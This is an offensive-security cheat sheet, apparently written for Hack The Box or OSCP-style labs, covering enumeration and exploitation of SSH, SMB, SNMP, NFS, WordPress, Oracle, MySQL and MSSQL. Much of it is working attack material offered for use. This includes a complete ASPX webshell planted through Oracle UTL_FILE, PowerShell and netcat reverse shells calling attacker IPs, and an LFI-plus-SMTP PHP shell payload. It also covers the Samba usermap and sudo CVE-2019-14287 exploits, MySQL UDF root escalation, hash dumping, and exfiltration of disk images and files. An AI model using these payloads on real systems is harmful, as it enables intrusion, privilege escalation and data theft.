www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 95 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Wed Dec 23 16:19:03 CET 2020
;; XFR size: 7 records (messages 1, bytes 203)

```
**Host:**
```
host -l domain.com ns1.domain.com
# always use -a flag due to the fact that sometimes the TXT record is not shown otherwise
host -l -a domain.com <ip ns>

```

### DNSRecon
```
dnsrecon -d domain -t axfr 
```

## SSH
### SSH issues
no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```
-oKexAlgorithms=+diffie-hellman-group1-sha1
```
no matching host key type found. Their offer: ssh-rsa,ssh-dss
```
oHostKeyAlgorithms=+ssh-dss
```

### Crack Passphrase for given SSH-Key
* [John The Ripper](https://github.com/openwall/john)
* [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
```
python3 ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=<wordlist>
john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
```
## SMB
### /etc/samba/smb.conf
Add the following to the global section 
```
client min protocol = CORE
client max protocol = SMB3
```

### List shares
```
smbclient -L \\10.10.10.3\
smbmap -H 10.10.10.3
```

### Connect to share
```
smbclient \\\\10.10.10.3\\sharename
smbclient //10.10.10.3/tmp # different syntax 
smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1' # for using insecure protocol if negotiation failed
```


## SNMP
```bash
snmpwalk
snmpwalk -c public -v2c 10.10.10.116
snmp-check
```

### Bruteforce Community Strings
```
echo public > community
echo private >> community
echo manager >> community

for ip in $(seq 1 254); do echo 10.10.10.$ip; done > ips

onesixtyone -c community -i ips
```

### Enumerate Windows users
```
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.4.1.77.1.2.25
```

### Enumerate Windows processes
```
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2
```

### Enumerate Open TCP Ports
```
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.6.13.1.3
```

### Enumerate Installed Software
```
snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.6.3.1.2
```

## POP3
Connect to port 110 and retreive mails (authenticated)
```
USER username
PASS password
LIST # list all mails
RETR 1 # retreive mail 1
```

## NFS
Mount the share
```
mount -t nfs -o port=4445 127.0.0.1:/srv/Share /tmp/pe -o nolock
```
Create directory and copy bash into it
```
mkdir /tmp/pe
cd /tmp/pe
cp /bin/bash .
```
set SUID
```
chmod +s bash
```
run as user
```
./bash -p
```

# Technologies
## WordPress
### wpscan
```
wpscan --url https://brainfuck.htb --disable-tls-checks
```
You can also bruteforce with wpscan
```
wpscan --url http://url.local --passwords passwords.txt
```

Enumerate all plugins
```
wpscan --url site.com -e ap
```

Using an API token for vulnerability data
```
wpscan --url http://10.11.1.251/wp -e ap --api-token <token> > wpscan.txt
```

### Upload Reverse Shell (Authenticated)
1. Go to plugins and click 'upload file'
2. upload a simple php reverse shell (e.g. laudanum's)
3. set up listener
4. browse to /wp-content/uploads
The plugin installation will fail but the file will be uploaded anyway

## SSL
### Check if Private Key matches Certificate

```
openssl x509 -noout in serct.crt | md5sum
openssl rsa -noout in key.key | md5sum	
```

### View CSR Entries
```
openssl req -text -noout -verify -in csr.csr
```

### View Certificate Entries
```
openssl x509 -text -noout -in crt.crt 
```

### Generate new Private Key and Certificate Signing Request (CSR)

```
openssl req -out CSR.csr -new -newkey rsa:4096 -nodes -keyout key.key
```

### Sign a CSR
```
openssl x509 -req -sha256 -days 1000 -in server.csr -signkey server.key -out server.pem
```

### Generate a self-signed Certificate

```
openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:4096 -keyout key.key -out crt.crt
```

### Verify (python3 https server)
First create .pem file with .crt and .key
```
cat crt.crt key.key > pem.pem
```
Then run the following script
```python3
#!/usr/bin/python3

import http.server
import ssl

httpd = http.server.HTTPServer(('localhost',4443),
        http.server.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket(httpd.socket, certfile='pem.pem', server_side=True)
httpd.serve_forever()
```
## RSA
Given: q, p, and e values for an RSA key, along with an encrypted message
The following script can be found [here](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e). It is using the extended eucledian algorithm for calculating the modulus inverse.

``` python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```


## WireShark
### Export Objects 
* File > Export Objects
### Filters
* ip.src ==
* ip.dst ==
* tcp.port == 22
* http.request.method == GET

## OracleDB
### nmap version scan
```
nmap -sV -p 1521 10.10.10.82 --script "oracle-tns-version"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:00 CET
Nmap scan report for silo.htb (10.10.10.82)
Host is up (0.097s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.88 seconds
```
### nmap SID brute force
```
nmap -sV -p 1521 10.10.10.82 --script "oracle-sid-brute"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 18:33 CET
Nmap scan report for silo.htb (10.10.10.82)
Host is up (0.096s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2703.94 seconds

```

### hydra SID brute force
```
hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 10.10.10.82 oracle-sid
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-06 18:30:04
[DATA] max 16 tasks per 1 server, overall 16 tasks, 576 login tries (l:576/p:1), ~36 tries per task
[DATA] attacking oracle-sid://10.10.10.82:1521/
[1521][oracle-sid] host: 10.10.10.82   login: XE
[1521][oracle-sid] host: 10.10.10.82   login: PLSExtProc
[STATUS] 496.00 tries/min, 496 tries in 00:01h, 80 to do in 00:01h, 16 active
[1521][oracle-sid] host: 10.10.10.82   login: CLRExtProc
[1521][oracle-sid] host: 10.10.10.82
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-06 18:31:35
```

### odat
* see: https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener
* install odat
```
pip3 install cx_Oracle
git clone https://github.com/quentinhardy/odat.git
cd odat
```
* bruteforce credentials
```
python3 odat.py all -s 10.10.10.82 -p 1521 -d XE

[1] (10.10.10.82:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.10.10.82:1521): Searching valid accounts on the XE SID

[+] Valid credentials found: scott/tiger. Continue... 
```

### Log in to Oracle DB with credentials
**install sqlplus:**
1. create /opt/oracle
2. download basic, sqlplus and sdk from [here](http://www.oracle.com/technetwork/database/features/instant-client/index-097480.html)
3. unzip
4. create symlink (adjust version number!): ```ln libclntsh.so.12.1 libclntsh.so``` and run ```ldconfig```
5. add the following to /etc/profile or .bashrc/.zshrc (adjust version number!):
```
export PATH=$PATH:/opt/oracle/instantclient_12_1
export SQLPATH=/opt/oracle/instantclient_12_1
export TNS_ADMIN=/opt/oracle/instantclient_12_1
export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_1
export ORACLE_HOME=/opt/oracle/instantclient_12_1
```
6. add oracle libraries to ldconfig:
```
echo "/opt/oracle/instantclient_12_1/" >> /etc/ld.so.conf.d/99_oracle
```
7. done, now run ```sqlplus <username>/<password>@<ip_address>/<SID>;```

**oracle commands:**
* show users: ```SQL> SELECT USERNAME FROM ALL_USERS ORDER BY USERNAME;```
* show tables: ``` SELECT owner, table_name FROM all_tables;```

### get reverse shell from oracle command line
* connect to oracle DB. make sure to use 'as sysdba' if possible!
```
sqlplus scott/tiger@10.10.10.82/XE 'as sysdba';
```
* oracle command line allows to write file. see [here](http://psoug.org/snippet/UTL_FILE-file-write-to-file-example_538.htm?)
* run the following 'query' to upload an aspx webshell
```
declare
  filehandler UTL_FILE.FILE_TYPE;
begin
  filehandler := UTL_FILE.FOPEN('C:/inetpub/wwwroot', 'mfu.aspx', 'W');
  UTL_FILE.PUTF(filehandler, '<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>
');
  UTL_FILE.FCLOSE(filehandler);
end;     
```
* now browse to http://10.10.10.82/mfu.aspx and run commands
* setup webserver with powershell script and a listener
```
powershell "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.29:8000/shell.ps1')"
```

## PowerShell Empire
PowerShell empire is a post-exploitation agent. Empire implements the ability to run PowerShell agents without needing powershell.exe, modules ranging from keyloggers to Mimikatz, and adaptable communications to evade network detection. This is all bundled into a framework which is publicly available on GitHub.

### Installation
```
sudo git clone https://github.com/PowerShellEmpire/Empire.git
cd Empire
sudo ./setup/install.sh
```
### Sample Commands
```
listeners
uselistener http # use tab (autocompletion) to get a list of available listeners
info
set Host 10.10.10.10
execute
back
usestager windows/launcher_bat
set Listener http
execute

agents
interact <Name> 

creds
creds add domain.com user pass!
```

### Migrate to another process
```
interact XYZXYZXY
ps
psinject http 3568
agents
interact ABCABCAB
```

### Modules
```
usemodule # use tab (autocompletion) to get a list of available listeners
```

### Switch between Empire and Metasploit
```
$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4444 -f exe -o exe.exe
# setup multi handler listener
Empire: SY24XF0J) > upload exe.exe
Empire: SY24XF0J) > shell dir
Empire: SY24XF0J) > shell C:\Users\user\Downloads\exe.exe

```
Other way
```
Empire: SY24XF0J) > usestager windows/launcher_bat
Empire: SY24XF0J) > set Listener http
Empire: SY24XF0J) > execute
meterpreter> upload launcher.bat
```


## MySQL
Connect remotely to mysql database
```
mysql --host=10.10.10.10 --port=1234 --user=db_user -p
```
Show privileges
```
SHOW Grants;
show variables;
```
### MySQL User Defined Functions (UDF)
See https://www.exploit-db.com/exploits/1518

Compile:
```
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

```
mysql> use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> create table foo(line blob);
Query OK, 0 rows affected (0.03 sec)

mysql> insert into foo values(load_file('/home/j0hn/raptor_udf2.so'));
Query OK, 1 row affected (0.00 sec)

mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
Query OK, 1 row affected (0.00 sec)

mysql> create function do_system returns integer soname 'raptor_udf2.so';
Query OK, 0 rows affected, 1 warning (0.00 sec)

mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function | 
+-----------+-----+----------------+----------+
1 row in set (0.00 sec)

mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                       4294967296 | 
+------------------------------------------------------------------+
1 row in set (0.00 sec)
```

## MSSQL
### Connect to MSSQL
```
impacket-mssqlclient user:password@10.11.10.10
```
### Reverse shell using xp_cmdshell
```
enable_xp_cmdshell
xp_cmdshell "powershell.exe wget http://192.168.119.134/nc.exe -OutFile C:\\Users\Public\nc.exe"
xp_cmdshell "C:\Users\Public\nc.exe -e cmd.exe 192.168.119.134 443
```

# Known Vulnerabilities
## Local File Inclusion (LFI)
### Example
* assume website provides functionality to view files
* if not properly sanitized input like ``../../../../../etc/passwd`` may be possible

### PHPInfo LFI
* see https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
* basic idea: race condition due to saving request (multipart) in file under /tmp/XYZ
* the filename can be found in the phpinfo page under variables
* the request should be as big as possible to increase processing time to win the race
* if you are able to browse/access this file before it gets deleted you have RCE

### LFI + SMPT Reverse Shell
* assume you have local file inclusion like:
```
GET //vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action HTTP/1.1
```
* additionally assume SMTP Port (25) is open
```
# connect
$> telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.

# wait for prompt
220 beep.localdomain ESMTP Postfix

# if enhanced
EHLO asdf

# if not
HELO asdf

# verify receipient
VRFY fanis@localhost
252 2.0.0 fanis@localhost # if exist
550 5.1.1 <asdf>: Recipient address rejected: User unknown in local recipient table # if not

# send mail with payload
mail from: manu@manu.ch
250 2.1.0 Ok
rcpt to: fanis@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system("/bin/bash -i >& /dev/tcp/10.10.14.4/3141 0>&1"); ?>

.
250 2.0.0 Ok: queued as E2517D92FD

```
* setup listener and send request to:
```
/vtigercrm/graph.php?current_language=../../../../../../../..//var/mail/fanis%00&module=Accounts&action
```

## Log Poisoning
* For this example a LFI is necessary to work
* prerequisite: accessing the http-log file is needed
* since your user agent is logged for example in /var/log/apache2/access.log you have full control
* modify user agent for example to: ``<?php exec("whoami");?>``
* browse to access log of web server

## ShellShock
### CVE-2014-6271
```
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

### Example from HTB (Shocker)

**Request:**
```
GET /cgi-bin/user.sh HTTP/1.1

Host: 10.10.10.56

User-Agent: () { :;};echo -e "\r\n$(/bin/cat /etc/passwd)"

Connection: close

```

**Response:**
```
HTTP/1.1 200 OK
Date: Tue, 06 Oct 2020 19:40:22 GMT
Server: Apache/2.4.18 (Ubuntu)
Connection: close
Content-Type: text/x-sh
Content-Length: 1687

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
.
.
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
shelly:x:1000:1000:shelly,,,:/home/shelly:/bin/bash

Content-Type: text/plain
Just an uptime test script
 15:40:23 up 15 min,  0 users,  load average: 0.00, 0.00, 0.00

```

## Dirtyc0w Kernel Exploit (Linux)
See https://github.com/firefart/dirtycow
1. Transfer .c file to target
2. compile it with ``gcc -pthread dirty.c -o dirty -lcrypt``
3. execute the binary ``./dirty newpassword``
4. user ``firefart`` is created with root privileges
## CVE-2007-2447 (smb usermap script)
### Example from Lame (HTB)
```
smbclient //10.10.10.3/tmp
smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manununu | /bin/sh >/tmp/manununu 2>&1; rm /tmp/manununu`"
```

## MS17-010 - CVE-2017-0143 (EternalBlue)
* see https://github.com/k4u5h41/MS17-010_CVE-2017-0143

## Sudo underflow bug (CVE-2019-14287)
```
sudo -u#-1 /bin/bash
```

# Forensics
## Memory Analysis
### msfpescan
* Search for jump equivalent instruction
* Search for pop+pop+ret combinations
* Search for regex match

### Get Function Address
```
objdump -d my.exe | grep func1
nm -A my.exe | grep func1
```

### .dmp file
* see https://www.aldeid.com/wiki/Volatility/Retrieve-password
**install volatility:**
```
virtualenv -p /usr/bin/pytohn2.7 venv
source venv/bin/activate
pip install pycrypto
pip install setuptools --upgrade
sudo apt install python-dev
pip install pycrpyto
pip install distorm3
sudo git clone https://github.com/volatilityfoundation/volatility
cd volatility
sudo python setup.py install
python vol.py -h
```
**get memory address (hivelist):**
```
python vol.py -f /home/kali/hackthebox/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist
Volatility Foundation Volatility Framework 2.6.1
Virtual            Physical           Name
------------------ ------------------ ----
0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat
0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS
0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve
0xffffc0000001e000 0x0000000000b65000 [no name]
0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM
0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE
0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD
0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE
0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT
0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY
0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM
0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI
0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat

```
**dump hashes:**
```
python vol.py -f /home/kali/hackthebox/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump 0xffffc00000028000
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```
## Reverse Engineering
### gdb
Example: Binary which prompting for a password. 
1. gdb --args ./holly.bin asdf
2. disassemble main
3. search for str -> copy address and set breakpoint: # most likely a strcmp function or smth. similar
4. b \*0x0000000000400d9d 
5. info registers
6. (gdb) x/s $rsi
7. 0x7fffffffdeb0: "holly-likes-alotta-crackas!"
8. (gdb) x/s $rdi
9. 0x7fffffffe33a: "asdf"

There is also a nice gdb plugin called [peda](https://github.com/longld/peda)

### .NET assembly decompiler
* [ILSpy](https://github.com/icsharpcode/ILSpy)
* [dotPeek](https://www.jetbrains.com/decompiler/)

### radare2 (r2)
```
r2 -d ./file

# analyze the program
aa

# list all functions
afl
afl | grep main

# print disassembly function
pdf @main

# Data Types
Initial Data Type | Suffix | Size (bytes)
-----------------------------------------
Byte	          |   b    |   1
Word              |   w    |   2
Double Word       |   l    |   4
Quad              |   q    |   8
Single Precision  |   s    |   8
Double Precision  |   l    |   4

# set breakpoint
db 0x00400b55

# ensure breakpoint is set correct
pdf @main

# run program until hit breakpoint
dc

# print memory address
px @memory-address
px rbp-0xc

# execute next instruction
ds

# see value of registers
dr

# reload program
ood
```

### Malware Analysis
* [REMNux](https://remnux.org/)


## System Images
**Transfer compressed image via netcat:**
```
dd if=/dev/dm-0 | gzip - | nc 10.10.14.23 3142
```
**Convert to raw:**
```
qemu-img convert vm.qcow2 vm.raw
```

**Get info:**
```
mmls vm.raw
sudo fdisk -l vm.raw
fsstat -o 2048 vm.raw
sudo sfdisk -d vm.raw
```
**Get offset and sizelimit:**
* run sfdisk -d vm.raw
* sample output:
```
[sudo] password for kali: 
label: dos
label-id: 0x50811ac7
device: vm.raw
unit: sectors
sector-size: 512

vm.raw1 : start=        2048, size=       36864, type=83, bootable
vm.raw2 : start=       38912, size=      233472, type=83
```
**calculate offset and sizelimit:**
```
echo $((2048 * 512)) $((36864 * 512))
```
**mount image:**
```
sudo mount -o ro,offset=1048576,sizelimit=18874368 vm.raw /media/image
```
* boot image using QEMU (Quick Emulator)
```
# install dependencies
apt install qemu qemu-kvm
# boot
qemu-system-x86_64 vm.raw -m 1024 # -m for specifying RAM
```

# Misc
## Bad Characters
```
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```
## Windows Ping Scan One-Liner
```
for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.11.%i > nul && echo 10.10.11.%i is up.
```

## Generate Shellcode from file
```
xxd -p lib.so | tr -d '\n' > lib.hex
# add '0x' before shellcode
```

## unshadow passwd file
```
unshadow passwd-file.txt shadow-file.txt
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

## Metasploit 
### multi handler
In case you got a Reverse Shell but the session immediately dies, try to migrate to another process with:
```
set AutoRunScript post/windows/manage/migrate
```

## Cross-Compiling Exploit Code
```
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o exploit.exe # In case of errors try -lws2_32 flag
```

## Run Windows Binary on Linux
```
wine PE.exe
```

## Render webpages from command line
* cutycapt: http://cutycapt.sourceforge.net/

## Create simple Upload Web Server
1. create /var/www/uploads folder and set owner to www-data
2. create /var/www/html/upload.php with following content
```
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $\_FILES['file']['name'];

move_uploaded_file($\_FILES['file']['tmp_name'], $uploadfile)
?>
```
3. Start apache2 server
4. Upload files from target to webserver. Example with powershell
```
powershell -c "iex(new-object system.net.webclient).uploadfile('http://192.168.1.13/upload.php', 'filename')"
```








